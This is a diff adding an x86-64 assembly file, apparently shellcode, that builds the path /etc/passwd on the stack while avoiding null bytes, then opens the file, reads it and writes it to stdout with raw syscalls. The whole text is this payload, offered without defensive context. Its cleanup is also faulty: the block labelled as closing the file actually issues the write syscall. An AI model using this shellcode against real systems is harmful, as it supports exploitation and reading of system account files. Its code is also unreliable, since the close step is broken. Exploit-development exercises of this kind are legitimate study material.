@@ -1,0 +1,51 @@
+# This code prints /etc/passwd file in stdout
+.global _start
+.text
+_start:
+mov r12, 0x6477737361702FFF
+shr r12, 8
+mov r13, r12
+push r13
+mov r12, 0xFFFFFFFF6374652F
+shl r12, 32
+push r12
+mov rdi, rsp
+add rdi, 4
+xor rsi, rsi
+xor rdx, rdx
+pop r15
+push r15
+push 0x2
+pop rax
+syscall
+push rax
+pop r12
+mov r13, 0x100
+sub rsp, r13
+loop_read:
+mov rdi, r12
+mov rsi, rsp
+mov rdx, r13
+xor rax, rax
+syscall
+xor r14, r14
+cmp rax, r14
+je close_file
+mov rdx, rax
+mov r14, 0x1
+mov rdi, 0x1
+mov rsi, rsp
+mov rax, 0x1
+syscall
+cmp rax, r14
+je  loop_read
+jne loop_read
+close_file:
+mov rdi, r12
+mov r14, 0x1
+mov rax, r14
+syscall
+xor rdi, rdi
+mov r14, 0x3c
+mov rax, r14
+syscall
